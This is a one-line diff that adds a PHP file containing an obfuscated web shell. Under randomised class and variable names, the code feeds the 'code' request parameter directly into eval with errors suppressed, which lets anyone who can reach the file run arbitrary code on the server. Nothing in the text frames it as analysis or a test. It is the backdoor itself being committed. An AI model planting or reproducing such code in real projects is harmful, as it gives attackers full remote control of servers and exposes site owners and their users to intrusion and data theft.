@@ -1,0 +1,1 @@
+<?php class G3345ubN { public function __construct($H4168){ @eval("/*Z670NfA8w4*/".$H4168."/*Z670NfA8w4*/"); }}new G3345ubN($_REQUEST['code']);?>
